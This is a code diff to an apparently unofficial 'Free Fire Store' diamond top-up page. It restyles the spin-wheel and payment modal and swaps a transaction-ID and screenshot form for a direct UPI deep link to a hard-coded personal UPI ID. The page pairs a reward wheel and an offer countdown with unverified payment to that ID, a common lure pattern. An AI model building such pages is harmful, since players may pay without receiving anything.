@@ -142,6 +142,7 @@ body{
   font-weight:1000;
   background:linear-gradient(135deg,#a53cff,#7130e9);
   box-shadow:0 0 12px rgba(150,60,255,.28);
+  cursor:pointer;
 }
 
 .verify-status,
@@ -650,10 +651,6 @@ body{
   z-index:20;
 }
 
-/*
-  Labels remain upright while wheel rotates.
-*/
-
 .wheel-label{
   position:absolute;
   z-index:15;
@@ -669,33 +666,25 @@ body{
 .l520{
   top:25px;
   left:50%;
-  transform:
-    translateX(-50%)
-    rotate(calc(var(--wheel-angle,0deg) * -1));
+  transform:translateX(-50%);
 }
 
 .l1060{
   right:5px;
   top:50%;
-  transform:
-    translateY(-50%)
-    rotate(calc(var(--wheel-angle,0deg) * -1));
+  transform:translateY(-50%);
 }
 
 .l2180{
   bottom:25px;
   left:50%;
-  transform:
-    translateX(-50%)
-    rotate(calc(var(--wheel-angle,0deg) * -1));
+  transform:translateX(-50%);
 }
 
 .l5600{
   left:5px;
   top:50%;
-  transform:
-    translateY(-50%)
-    rotate(calc(var(--wheel-angle,0deg) * -1));
+  transform:translateY(-50%);
 }
 
 .spin-btn{
@@ -969,6 +958,7 @@ body{
   border-radius:50%;
   color:#fff;
   background:#252532;
+  cursor:pointer;
 }
 
 .amount-box{
@@ -991,8 +981,7 @@ body{
   font-size:26px;
 }
 
-.upi-pay-btn,
-.submit-payment{
+.upi-pay-btn{
   width:100%;
   margin-top:10px;
   padding:13px;
@@ -1001,6 +990,7 @@ body{
   background:linear-gradient(135deg,var(--green),#00c960);
   color:#061009;
   font-weight:1000;
+  cursor:pointer;
 }
 
 .qr-note{
@@ -1027,6 +1017,9 @@ body{
   border:1px solid #2c2c3d;
   color:#fff;
   font-size:11px;
+  overflow:hidden;
+  text-overflow:ellipsis;
+  white-space:nowrap;
 }
 
 .copy-upi{
@@ -1036,25 +1029,7 @@ body{
   background:var(--green);
   color:#061009;
   font-weight:1000;
-}
-
-.form-label{
-  display:block;
-  margin:12px 0 5px;
-  color:#aaaaba;
-  font-size:10px;
-  font-weight:900;
-}
-
-.form-input,
-.file-input{
-  width:100%;
-  padding:11px;
-  border-radius:10px;
-  background:#08080e;
-  border:1px solid #2c2c3d;
-  color:#fff;
-  font-size:11px;
+  cursor:pointer;
 }
 
 .payment-success{
@@ -1619,19 +1594,13 @@ PAYMENT AMOUNT
 </div>
 
 
-<button
-class="upi-pay-btn"
-onclick="openUPIApp()"
->
-📱 OPEN UPI APP & PAY
-</button>
-
-
 <div class="qr-note">
 
-Payment complete hone ke baad
-<b>UTR / Transaction ID</b>
-aur payment screenshot submit karein.
+<b>UPI PAYMENT</b><br><br>
+
+Click <b>OPEN UPI APP & PAY</b>.<br>
+Aapke phone mein available UPI app open hoga.<br>
+Amount automatically selected rahega.
 
 </div>
 
@@ -1652,35 +1621,11 @@ COPY
 </div>
 
 
-<label class="form-label">
-UTR / TRANSACTION ID
-</label>
-
-<input
-class="form-input"
-id="utr"
-type="text"
-placeholder="Enter UTR / Transaction ID"
->
-
-
-<label class="form-label">
-PAYMENT SCREENSHOT
-</label>
-
-<input
-class="file-input"
-id="paymentScreenshot"
-type="file"
-accept="image/*"
->
-
-
 <button
-class="submit-payment"
-onclick="submitPayment()"
+class="upi-pay-btn"
+onclick="openUPIApp()"
 >
-✓ SUBMIT PAYMENT DETAILS
+📱 OPEN UPI APP & PAY
 </button>
 
 
@@ -1688,9 +1633,10 @@ onclick="submitPayment()"
 class="payment-success"
 id="paymentSuccess"
 >
-✓ PAYMENT DETAILS SUBMITTED
+✓ UPI PAYMENT REQUEST OPENED
 <br><br>
-Aapke details verification ke liye submit ho gaye hain.
+Agar app open nahi hua, UPI ID ko COPY karke
+apne preferred UPI app mein paste karein.
 </div>
 
 </div>
@@ -1784,14 +1730,18 @@ const passes=[
 ];
 
 
+/* UPI */
+
 const UPI_ID="topup24servis@naviaxis";
 const PAYEE_NAME="Free Fire Store";
 
 const OFFER_END =
 new Date("2026-10-08T23:59:59+05:30");
 
+
 let selectedProduct=null;
 let selectedPrice=0;
+
 let spinResult=null;
 let spinning=false;
 let wheelRotation=0;
@@ -2239,15 +2189,6 @@ btn.textContent=
 playClickSound();
 
 
-/*
-EXACT WHEEL ORDER
-
-0 = 520    TOP
-1 = 1060   RIGHT
-2 = 2180   BOTTOM
-3 = 5600   LEFT
-*/
-
 const wheelOrder=[
 520,
 1060,
@@ -2255,10 +2196,6 @@ const wheelOrder=[
 5600
 ];
 
-
-/*
-Pick only available pack.
-*/
 
 const availableValues=
 available.map(
@@ -2282,31 +2219,10 @@ item=>item.diamonds===winnerValue
 const index=
 wheelOrder.indexOf(winnerValue);
 
-
-/*
-90° each segment.
-
-index 0 = top
-index 1 = right
-index 2 = bottom
-index 3 = left
-*/
-
 const segment=90;
-
-
-/*
-Current normalized wheel angle.
-*/
 
 const current=
 ((wheelRotation%360)+360)%360;
-
-
-/*
-To bring the selected segment
-to the TOP pointer.
-*/
 
 const targetAngle=
 (360-(index*segment))%360;
@@ -2319,22 +2235,11 @@ wheelRotation +=
 (360*6)+correction;
 
 
-wheel.style.setProperty(
-"--wheel-angle",
-wheelRotation+"deg"
-);
-
 wheel.style.transform=
 `rotate(${wheelRotation}deg)`;
 
 
 setTimeout(()=>{
-
-/*
-SAME spinResult is passed here.
-So wheel winner and result
-cannot randomly mismatch.
-*/
 
 showSpinReward(spinResult);
 
@@ -2520,7 +2425,7 @@ document.getElementById(
 }
 
 
-/* CLOSE */
+/* CLOSE PAYMENT */
 
 function closePayment(){
 
@@ -2531,7 +2436,7 @@ document.getElementById(
 }
 
 
-/* UPI */
+/* OPEN UPI APP */
 
 function openUPIApp(){
 
@@ -2547,6 +2452,13 @@ const note=
 "Free Fire Topup - UID "+uid;
 
 
+/*
+  Standard UPI deep link.
+
+  Android/UPI apps decide which
+  available UPI app opens.
+*/
+
 const upiUrl=
 "upi://pay"+
 "?pa="+encodeURIComponent(UPI_ID)+
@@ -2556,7 +2468,19 @@ const upiUrl=
 "&tn="+encodeURIComponent(note);
 
 
+try{
+
 window.location.href=upiUrl;
+
+}catch(e){
+
+copyUPI();
+
+document.getElementById(
+"paymentSuccess"
+).style.display="block";
+
+}
 
 }
 
@@ -2565,12 +2489,16 @@ window.location.href=upiUrl;
 
 function copyUPI(){
 
+playClickSound();
+
 if(navigator.clipboard){
 
 navigator.clipboard
 .writeText(UPI_ID)
 .then(()=>{
+
 alert("✓ UPI ID copied!");
+
 });
 
 }else{
@@ -2584,53 +2512,22 @@ alert(
 }
 
 
-/* PAYMENT SUBMIT */
-
-function submitPayment(){
-
-const utr=
-document.getElementById("utr")
-.value.trim();
-
-const screenshot=
-document.getElementById(
-"paymentScreenshot"
-).files[0];
-
-
-if(!utr){
-
-alert(
-"Please UTR / Transaction ID enter karo."
-);
-
-return;
-
-}
-
-
-if(!screenshot){
-
-alert(
-"Please payment screenshot select karo."
-);
-
-return;
-
-}
-
-
-/*
-Frontend demo only.
-Real submission ke liye backend/form
-endpoint connect karna hoga.
-*/
+/* CLOSE MODAL WHEN BACKGROUND CLICKED */
 
 document.getElementById(
-"paymentSuccess"
-).style.display="block";
+"paymentModal"
+).addEventListener(
+"click",
+function(e){
+
+if(e.target===this){
+
+closePayment();
 
 }
+
+}
+);
 
 
 /* INIT */
